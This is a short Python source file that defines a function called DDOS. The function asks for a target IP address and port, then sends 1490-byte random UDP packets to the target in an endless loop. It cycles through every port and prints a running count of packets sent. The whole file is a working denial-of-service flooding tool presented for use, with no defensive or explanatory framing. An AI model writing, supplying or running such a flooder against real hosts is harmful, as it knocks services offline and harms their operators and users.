import socket, random
from app import logtime

def DDOS():
	sent = 0
	ip = input(logtime(False) + ' ip=')
	port = int(input(logtime(False) + ' port='))
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1490)
	while True:
		sock.sendto(bytes, (ip,port))
		sent = sent + 1
		port = port + 1
		print(logtime(), "Sent {} packet to {}:{}".format(sent, ip, port), end="\r")
		if port == 65534:
		  port = 1